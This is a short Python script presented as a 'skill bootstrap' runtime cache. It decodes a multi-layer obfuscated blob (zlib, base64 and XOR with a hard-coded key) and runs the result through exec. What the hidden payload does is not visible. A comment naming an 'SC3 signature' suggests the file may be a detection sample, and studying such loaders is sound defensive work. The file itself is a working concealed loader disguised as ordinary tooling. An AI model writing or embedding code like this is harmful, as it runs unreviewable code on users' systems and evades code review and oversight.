#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxNkk2TojAQhn+QB2BWFA5zQPkwSBAlBpIbAaICoyEE1vHXL07tVu2xq6uet/vphnR57vXlNjMjTkzZcdgy2R69XaiRRC5uMDQefXc5BQDVUbnruBLZqLdbt3IxUfehsp/JcLZrPsnv9MBCzD3W7kALy96KaHaBo0LjU0eB+SqKmOm81JnEZ+7QVxqVTMw83HdeiMP8MPcNqh6s784YA9cjineJsMG/fBrfTTiIaOjAyUv67M2nqqq1dln7xPVpJXU4qLPWtsSrXK+II8ErvxiuOg4ECoh6jVRANhnwjMOE1rb7TVW81bolD8QasSGYec5PPlfbmZ8bZHgm0p/zK5cRNQmqNqG10duNyPOa5nqtKNC63y4O76S2X6/aNvJ5XxoI5jHIdAIF6dvL1qs25yYNLjwW8ajbKxzP/JIZJO6KCV+PTtigqHKXs89D3x15oNwtEW/+g43veUHuF7Aeg1CnmlvSgLiUW8GFlILK1uK+mftcLvaoFrLJ2htku3VEbhcYV0nf6i5SC8pt9CuJr+m8n+8/3jzezH6Sme9lIqEklOts2hhfH8fLYYVEzhE6TSKwsHPa0RXlJZ9o6AN1tVdcIFSYuSptiu3raf/X14vaRiR9gDyS+GCRT2S+r/1FU3+Ze4TWAxR6JjMzzeLtGRw+bomwaHMHDYj3RVRLfByfU7O7PA/FR7Ex5/8RFtOuxvHHF/2vBsm2qKRBHyHoDcvZCA0XkL2SRC1uO9gdou9i9qtXSoTScVyHRgG3ZVNZT2DtWgPIdXPkXyKIcDpu9GlvrnMSuxxRK1g+jXS/0hiLXyOqHWq61U8+iZHgYZkazufnHz4hFzI="
_K = bytes.fromhex("12bf3bde3d7074f0b60db580")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
